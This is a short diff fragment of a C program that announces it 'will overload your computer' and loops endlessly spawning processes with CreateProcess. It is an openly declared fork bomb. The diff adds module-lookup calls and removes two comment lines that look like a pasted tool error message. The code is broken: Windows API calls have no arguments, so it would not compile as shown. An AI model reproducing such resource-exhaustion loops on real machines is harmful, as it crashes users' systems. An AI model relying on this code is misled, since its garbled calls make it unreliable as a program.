@@ -5,9 +5,9 @@
 void main(void) {
 	printf("This is a program that will overload your computer\n");
 	while (1) {
+		GetModuleFileName();
+		GetModuleHandle(NULL);
 		printf("forking\n");
 		CreateProcess();
 	}
 }
-//Value cannot be null.
-//Parameter name: solutionDirectory
